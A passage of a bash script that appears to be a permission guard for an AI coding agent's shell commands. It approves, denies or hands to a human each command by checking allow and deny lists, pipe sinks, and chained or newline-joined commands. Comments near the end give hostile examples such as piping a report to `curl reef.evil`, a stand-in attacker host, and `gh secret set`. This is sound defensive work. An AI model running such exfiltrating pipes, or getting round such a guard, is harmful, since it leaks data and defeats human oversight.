#      past its flags (command_has_denied_skill_verb).
# .the allow/deny asymmetry (deliberate): command_is_allowed QUOTES the prefix (literal
#   match — a `*` in an allow pattern matches a literal `*` only). command_is_denied leaves
#   the prefix UNQUOTED so a `*` acts as a GLOB, exactly as claude-cli treats a deny
#   pattern (e.g. `rhx git.commit.uses --org * del` must catch `--org shadyorg del`). the
#   asymmetry is safe by direction: for ALLOW, an under-match only LIFTS (fail-safe); for
#   DENY, an under-match would be a HOLE, so deny must err toward the wider match.
command_is_denied() {
  local raw="$1"
  canonicalize_rhx_command "$raw"
  local cmd="$CANON"
  [[ -z "$cmd" ]] && return 1
  if [[ -n "${EXACT_DENY_PATTERNS[$cmd]+x}" ]]; then return 0; fi
  # word-order-independent veto: a reordered form of a denied rhx skill+verb (flags moved
  # around the verb) escapes the strict prefix match below, so catch it as an unordered
  # set over the RAW atom's quote-aware argv (so a quoted data verb-word is not mistaken).
  command_has_denied_skill_verb "$raw" && return 0
  local prefix
  for prefix in "${PREFIX_DENY_PATTERNS[@]}"; do
    # UNQUOTED $prefix: a `*` in the human's deny pattern globs (claude-cli semantics —
    # `--org * del` must catch `--org shadyorg del`).
    # .scope-note: an unquoted bash `[[ == ]]` treats `?` (single char) and `[...]` (char
    #   class) as metachars too, NOT just `*`. today's deny vocabulary is skill names +
    #   flags, which do not carry `?`/`[`/`]`, so the widened glob never bites in practice.
    #   the risky direction for a DENY would be an UNDER-match (a `[` read as a class so a
    #   literal `[` in the human's pattern fails to match a literal `[` in the command = a
    #   hole); it is accepted here as a known, low-likelihood edge because escaping the
    #   metachars would also break the intended `*` glob, and the vocabulary makes it moot.
    #   if a deny pattern ever needs a literal `?`/`[`, revisit with a `*`-only matcher.
    [[ "$cmd" == $prefix ]] && return 0
    [[ "$cmd" == $prefix[[:space:]]* ]] && return 0
  done
  return 1
}

# .what = transformer: the first whitespace-delimited token of a command (its lead).
# .why  = a reader SINK is judged by its lead token (`jq`), so `jq .`, `jq -c`, `jq -r`
#         all qualify — a whole-command allowlist match would miss them (`jq` is an
#         exact allowlist entry, not a prefix).
lead_token() {
  local t; trim_ws "$1"; t="$TRIMMED"
  t="${t%%[[:space:]]*}"
  printf '%s' "$t"
}

# .the reader allowset = read-only tools SAFE as a pipe SINK (they consume stdin and
# emit bytes; they do not execute arbitrary code). a sink that is allowlisted but
# code-EXECUTES (npm run <task>, bash) is NOT here — it would run with attacker-
# influenced stdin. this is the narrower SINK bar (vs the wider producer bar).
READERS=" jq tail head wc cat "

# the first-unsafe breadcrumb slots: is_pipe_group_safe records the failed atom + bar
# here so the LIFT breadcrumb names the exact cause. declared up front for set -u.
UNSAFE_ATOM=""
UNSAFE_BAR=""

# the pipe-group ranges, derived by compute_pipe_group_ranges from the ONE scan.
# each entry is a "start:end" atom-index pair. declared up front for set -u.
PIPE_GROUP_RANGES=()

# .what = predicate: is a command a safe reader SINK?
# .why  = its lead token must be in the reader allowset AND the human must allow that
#         lead (command_is_allowed on the bare lead — so `jq .` clears via `jq`). both:
#         read-only by nature AND sanctioned by the human's list.
# .note = reader-sink safety is an AND of TWO authorities, so it can narrow from EITHER
#         side: (a) the hardcoded READERS set, and (b) the human's Bash allowlist. a tool
#         admits as a sink ONLY if it sits in both. so if a human ever TRIMS a reader from
#         settings (e.g. drops `wc` in an unrelated cleanup), sink-safety for that tool
#         narrows too — the two concerns are joined, and neither the SessionStart banner nor
#         howto.triage-permission-prompts surfaces the joint. a narrower set is fail-safe
#         (fewer sinks admit -> more LIFTs, never a new approve), but a maintainer who edits
#         one authority should know it moves the other.
is_reader_sink() {
  local lead; lead="$(lead_token "$1")"
  [[ -z "$lead" ]] && return 1
  [[ "$READERS" == *" $lead "* ]] || return 1
  command_is_allowed "$lead" || return 1
  return 0
}

# .what = predicate: does a SEGMENT's precomputed residue hold only inert chars?
# .why  = the seam's safety floor — a segment whose active residue carries an unquoted
#         $ ` < > ( ) etc is not provably safe, so it never clears any bar. the residue
#         was produced by the ONE command scan (compute_command_scan), so this is a
#         pure char check on that residue — NOT a second parse.
is_segment_residue_clean() {
  case "$1" in
    *[![:alnum:]_./=:@,+[:blank:]-]*) return 1 ;;
  esac
  return 0
}

# .what = the shared safety-bar shape: the checks EVERY bar runs, in order, with ONE
#         pluggable final admit-check that separates a producer from a sink.
# .why  = the producer and sink bars differ by EXACTLY one line (the final admit); the
#         other three (residue-clean floor, deny veto, clean-rhx admit) are a single safety
#         contract that must stay in lockstep. one shared shape means a future safety-floor
#         change (a new pre-check, a 3rd bar) lands ONCE, not hand-mirrored into two
#         near-twins — the manual mirror the deny-honor fix had to do, and the exact drift
#         class the file's own loose-recognizer bug proved costly.
# .inputs = $1 = atom text, $2 = precomputed active residue, $3 = the admit-check fn name.
is_bar_safe() {
  local atom="$1" residue="$2" admit_check="$3"
  is_segment_residue_clean "$residue" || return 1
  # the human's explicit deny overrides any clean shape — a denied segment fails its bar
  # so the whole compound LIFTS.
  command_is_denied "$atom" && return 1
  is_clean_rhx_call "$atom" "$residue" && return 0
  "$admit_check" "$atom" && return 0
  return 1
}

# .what = the PRODUCER bar (wider): a stage left of a pipe, or a bare chain segment.
# .why  = an allowlisted producer is already trusted by the human to run alone; a pipe
#         of its stdout onward grants it no new authority. so: clean-rhx OR allowlisted.
# .inputs = $1 = the atom text, $2 = the atom's precomputed active residue.
is_producer_safe() { is_bar_safe "$1" "$2" command_is_allowed; }

# .what = the SINK bar (narrower than the producer bar): a stage right of a pipe.
# .why  = a sink RUNS with attacker-influenced stdin. the bar admits a clean-rhx call
#         OR a read-only reader (jq/tail/head/wc/cat by lead token), and EXCLUDES an
#         allowlisted-but-code-exec sink (npm run/bash) — same as the producer bar, EVERY
#         segment first clears command_is_denied, so the human's explicit deny wins over
#         any clean shape.
#         TWO safety layers keep a clean-rhx sink honest, in order:
#         (1) the human's deny-list (PRIMARY) — `rhx git.commit.bind set` and `rhx
#             git.commit.uses set` are BOTH in permissions.deny, so command_is_denied
#             refuses them here and the compound LIFTS. this needs no per-skill audit and
#             holds even for a skill with NO execution guard (git.commit.bind writes
#             .branch/.bind with no TTY check — protected ONLY by its deny entry).
#         (2) the skill's own execution self-guard (BACKSTOP) — a sensitive rhx skill
#             that is NOT deny-listed can still refuse a piped call at run time (e.g.
#             git.commit.uses.local.sh: `[[ ! -t 0 ]] -> exit 2 "only humans"`; a PIPE
#             removes the TTY). this is the repo's documented division of responsibility
#             (define.why-permission-guards-allowlist-all-rhx: the seam asks "clean rhx or
#             a chain?"; the skill asks "is this allowed for this caller?").
#         the asymmetry — a non-denied clean-rhx sink IN, npm-run/bash sink OUT — is
#         principled: an rhx skill can self-guard (layer 2); npm-run/bash cannot, so they
#         stay out. this also preserves the phase-1 `echo … | rhx … --old @stdin`
#         stdin-payload workaround (sedreplace is neither denied nor code-exec).
# .inputs = $1 = the atom text, $2 = the atom's precomputed active residue.
is_sink_safe() { is_bar_safe "$1" "$2" is_reader_sink; }

# .what = predicate: is ONE pipe-group (atoms [start..end], joined by `|`) safe?
# .why  = stage 0 (the producer) is judged by the wider producer bar; EVERY downstream
#         stage (1..end) by the narrower sink bar (clean-rhx OR a read-only reader). an
#         N-stage reader pipe (`rhx … | jq | tail`, the vision's own example) is exactly
#         as safe as a 2-stage one: a reader is read-only, so each added reader stage
#         grants no authority beyond the producer's already-vetted stdout, and a code-exec
#         sink (npm run/bash) fails the sink bar at ANY stage. reads the ONE scan's
#         ATOMS[]/ATOM_RESIDUES[] by index — no re-scan, no global clobber. on failure,
#         records the failed atom + which bar it failed into UNSAFE_ATOM / UNSAFE_BAR so
#         the LIFT breadcrumb can name the exact cause (points the human at the segment,
#         not a manual bisect).
is_pipe_group_safe() {
  local start="$1" end="$2"
  # stage 0 — the producer, the wider {clean-rhx OR allowlisted} bar
  if ! is_producer_safe "${ATOMS[$start]}" "${ATOM_RESIDUES[$start]}"; then
    UNSAFE_ATOM="${ATOMS[$start]}"; UNSAFE_BAR="producer"
    return 1
  fi
  # stages 1..end — every downstream sink, the narrower {clean-rhx OR reader} bar. a
  # single-stage group (start == end) skips this loop; a code-exec sink at ANY depth fails.
  local i
  for (( i = start + 1; i <= end; i++ )); do
    if ! is_sink_safe "${ATOMS[$i]}" "${ATOM_RESIDUES[$i]}"; then
      UNSAFE_ATOM="${ATOMS[$i]}"; UNSAFE_BAR="sink"
      return 1
    fi
  done
  return 0
}

# .what = derive the pipe-group ranges from the ONE scan's atoms + separators.
# .why  = a pipe-group is a maximal run of atoms joined by `|`; it ends at the first
#         non-`|` separator (or the last atom). a named transformer for this derivation
#         lets is_all_segments_safe read as narrative — judge each group — instead of an
#         inline accumulator fold. reads the ONE scan's SEPS by index; no re-parse.
# .output = fills PIPE_GROUP_RANGES with "start:end" atom-index pairs.
compute_pipe_group_ranges() {
  PIPE_GROUP_RANGES=()
  local n=${#ATOMS[@]}
  local group_start=0 idx=0 sep
  while [[ "$idx" -lt "$n" ]]; do
    sep=""
    [[ "$idx" -lt "$((n-1))" ]] && sep="${SEPS[$idx]}"
    if [[ "$sep" != "|" ]]; then
      PIPE_GROUP_RANGES+=("$group_start:$idx")
      group_start=$((idx+1))
    fi
    idx=$((idx+1))
  done
}

# .what = predicate: is the whole command an all-safe-segments compound?
# .why  = the heart of the widened approve. the command must have balanced quotes (an
#         unbalanced command can never be proven safe); then every pipe-group (derived
#         by compute_pipe_group_ranges) must pass is_pipe_group_safe. reads as
#         narrative: derive the groups, judge each one. consumes the precomputed scan.
is_all_segments_safe() {
  [[ "$CMD_BALANCED" == true ]] || return 1
  UNSAFE_ATOM=""; UNSAFE_BAR=""
  compute_pipe_group_ranges
  local range
  for range in "${PIPE_GROUP_RANGES[@]}"; do
    is_pipe_group_safe "${range%:*}" "${range#*:}" || return 1
  done
  return 0
}

# .what = predicate: does the full-command residue DETACH a second command via a lone
#         background `&` or a newline/CR?
# .why  = a lone `&` detaches a gated command from the gate; a newline/CR is the classic
#         multi-line injection separator. both must DENY even when every segment looks
#         safe. `&&` is a conditional CHAIN (judged per-segment in step 2, not a detach),
#         so it is stripped FIRST to disambiguate `A && B` from `A & B`.
is_background_or_newline_detach() {
  local residue="$1"
  local residue_no_and="${residue//&&/}"
  [[ "$residue_no_and" == *"&"* ]] && return 0
  [[ "$residue" == *$'\n'* ]] && return 0
  [[ "$residue" == *$'\r'* ]] && return 0
  return 1
}

# .what = predicate: was the is_all_segments_safe failure caused ONLY by degenerate
#         EMPTY/whitespace atoms (a stray, doubled, lead, or tail separator)?
# .why  = an empty atom carries NO command — a stray `;`, a doubled `;;`, a lead/tail
#         separator is a shell no-op (`rhx foo;`) or a bash syntax error (`rhx foo ;; rhx bar`),
#         never a smuggled command. so it is a SHAPE ARTIFACT, not a threat. this predicate
#         re-judges every NON-EMPTY atom by its POSITION bar (producer at a pipe-group start,
#         sink downstream) — the SAME predicates step 2 uses, position-aware via the ONE scan's
#         PIPE_GROUP_RANGES, no coarse residue re-derive. if every non-empty atom clears its
#         bar, the only failure was empty atoms -> the command is degenerate -> LIFT (defer to
#         the human), consistent with the empty-pipe-half (`echo hi |`) which also LIFTs. this
#         is what discriminates a benign stray separator from a real un-vetted-segment smuggle,
#         so step 3 never emits a false "smuggle" DENY on a no-op separator.
is_failure_degenerate_only() {
  local range start end i atom trimmed
  for range in "${PIPE_GROUP_RANGES[@]}"; do
    start="${range%:*}"; end="${range#*:}"
    for (( i = start; i <= end; i++ )); do
      atom="${ATOMS[$i]}"
      trim_ws "$atom"; trimmed="$TRIMMED"
      # an empty/whitespace atom is a stray-separator artifact — skip it
      [[ -z "$trimmed" ]] && continue
      # a non-empty atom must clear its POSITION bar; if any fails, the failure is a REAL
      # un-vetted segment, not a degenerate separator
      if [[ "$i" -eq "$start" ]]; then
        is_producer_safe "$atom" "${ATOM_RESIDUES[$i]}" || return 1
      else
        is_sink_safe "$atom" "${ATOM_RESIDUES[$i]}" || return 1
      fi
    done
  done
  return 0
}

# .what = predicate: does the full-command residue chain a second command via ; && ||?
# .why  = reached only AFTER the all-safe-segments check fails AND the failure is NOT a mere
#         degenerate separator (is_failure_degenerate_only ruled that out first). so a chain
#         operator here joins a real, un-vetted, NON-EMPTY segment — a smuggle to DENY. a lone
#         `|` is a data pipeline, not a chain, so it is absent from this set and falls through
#         to LIFT (an un-allowlisted pipe sink defers to the human, never a smuggle DENY).
# .note = the empty-atom discrimination lives in is_failure_degenerate_only (the step-3 guard),
#         NOT here — this predicate is a pure chain-operator presence check on the residue, and
#         trusts the guard to have already sent a stray/doubled/lead/tail separator to LIFT.
#         one authority for the empty-atom question, not two.
is_unvetted_chain_smuggle() {
  local r="$1"
  case "$r" in
    *";"*|*"&&"*|*"||"*) return 0 ;;
  esac
  return 1
}

# --- the decider, as narrative ---

# load the human-curated allow + deny sets once — the allow set is the authority for a
# segment's producer/reader bar; the deny set is the human's explicit "never auto-run",
# honored so a denied clean-rhx call (e.g. `rhx git.commit.bind set`) cannot slip through.
load_patterns allow EXACT_PATTERNS PREFIX_PATTERNS
load_patterns deny EXACT_DENY_PATTERNS PREFIX_DENY_PATTERNS

# scan the command ONCE (the single quote-aware pass) into atoms + per-atom residues +
# the full-command residue + the balance flag. every downstream judgement reads this one
# scan — there is no second parser over the bytes (the vision's hard constraint).
compute_command_scan "$CMD"
FULL_RESIDUE="$CMD_RESIDUE"
FULL_RESIDUE_BALANCED="$CMD_BALANCED"

# 1. a background `&` or a newline/CR runs or detaches a second command -> DENY.
if is_background_or_newline_detach "$FULL_RESIDUE"; then
  emit_deny "backgrounds (&) or newline-joins a second command; banned — run each command as its own separate call"
  exit 0
fi

# 2. an all-safe-segments compound -> APPROVE. each chain-segment is judged: a bare
#    command by the PRODUCER bar (clean-rhx OR allowlisted), an N-stage pipe by
#    producer-then-sinks where each downstream SINK bar is narrower (clean-rhx OR a
#    read-only reader). this widens the old two-shape rule to any compound the human
#    already trusts part-by-part, while the sink bar keeps attacker-influenced stdin
#    out of a code-exec sink (npm run/bash) at any pipe depth.
if is_all_segments_safe; then
  # the reason names the ACTUAL shape, so it never over-claims. three truthful shapes:
  #   - one atom            -> a single clean-rhx-or-allowlisted call (no pipe sinks)
  #   - a compound with a |  -> each pipe sink is a read-only reader
  #   - a pure ; && || chain -> NO pipe sinks, so the sink clause is dropped
  # `clean-rhx-or-allowlisted` is the ONE canonical form of the predicate, shared by every
  # reason + the SessionStart banner (so the promise the human reads matches the reason the
  # seam emits).
  decide_has_pipe=false
  for decide_sep in "${SEPS[@]}"; do [[ "$decide_sep" == "|" ]] && decide_has_pipe=true; done
  if [[ "${#ATOMS[@]}" -le 1 ]]; then
    emit_allow "single clean-rhx-or-allowlisted call; safe by design"
  elif [[ "$decide_has_pipe" == true ]]; then
    # a pipe sink admits EITHER a clean-rhx call OR a read-only reader — the reason must
    # name both, so a clean-rhx sink (`X | rhx Y`, the phase-1 stdin-payload shape) is not
    # mis-described as a "read-only reader" (rhx executes a skill, it is not a reader).
    emit_allow "every segment clean-rhx-or-allowlisted; each pipe sink clean-rhx or a read-only reader; safe by parts"
  else
    emit_allow "every segment clean-rhx-or-allowlisted; safe by parts"
  fi
  exit 0
fi

# 3. a chain (; && ||) whose segments are NOT all safe smuggles an un-vetted command
#    -> DENY (the prior posture for an unsafe chain, preserved). a plain single pipe is
#    a data pipeline, not a chain, so it falls through to LIFT, not DENY.
#    .guard = FIRST rule out a merely DEGENERATE separator (a stray/doubled/lead/tail `;`
#    that made an empty atom fail step 2 — a no-op or syntax error, not a smuggle). only a
#    failure caused by a REAL, non-empty, un-vetted segment reaches the chain-smuggle DENY;
#    a degenerate one falls through to LIFT, consistent with the trailing-separator case.
if ! is_failure_degenerate_only && is_unvetted_chain_smuggle "$FULL_RESIDUE"; then
  emit_deny "chains an un-vetted command via ; && or ||; banned — run each command as its own separate call"
  exit 0
fi

# 4. else -> LIFT: emit no stdout (claude falls back to a brain — human now). a one-line
#    stderr breadcrumb names WHY it lifted, OFF the critical path.
if [[ "$FULL_RESIDUE_BALANCED" != true ]]; then
  emit_lift "unbalanced quotes in command"
  exit 0
fi
if [[ -n "$UNSAFE_ATOM" ]]; then
  # trim head blanks so the named segment reads clean (`sort`, not ` sort`).
  trim_ws "$UNSAFE_ATOM"
  # distinguish the security-critical cause: a segment that matched the human's OWN
  # permissions.deny reads, in a generic "failed the <bar> bar" crumb, like a mere
  # allowlist miss — which buries the actionable signal ("you explicitly denied this").
  # re-check command_is_denied (deterministic) so the deny-honor LIFT names the deny-list.
  if command_is_denied "$UNSAFE_ATOM"; then
    emit_lift "segment is on your permissions.deny list: $TRIMMED"
    exit 0
  fi
  # a SINK-bar miss is the code-exec-sink case (`rhx get.wave.report | npm run riptide`,
  # `rhx get.wave.report | gh secret set`, `rhx get.wave.report | curl reef.evil`):
  # refused because it would RUN on attacker-influenced stdin, and — unlike rhx — has no
  # execution-time self-guard. the ONLY auto-approved ACTIVE sink is a clean-rhx call (rhx
  # owns the hostile-stdin burden at execution; define.why-permission-guards-allowlist-all-rhx),
  # so NAME that fix, not just the miss. the fix wraps as short leaves, not one over-wide line.
  if [[ "$UNSAFE_BAR" == "sink" ]]; then
    emit_lift \
      "segment failed the sink bar: $TRIMMED" \
      "fix: make the sink a read-only reader (jq/tail/head/wc/cat) or a clean-rhx call" \
      "or wrap it as an rhx skill hardened against a hostile stdin, or run it as its own Bash call"
    exit 0
  fi
  emit_lift "segment failed the $UNSAFE_BAR bar: $TRIMMED"
  exit 0
fi
emit_lift \
  "not an all-safe-segments compound:" \
  "a segment is neither a clean-rhx call nor allowlisted," \
  "or a pipe sink is not a read-only reader (jq/tail/head/wc/cat)"
exit 0
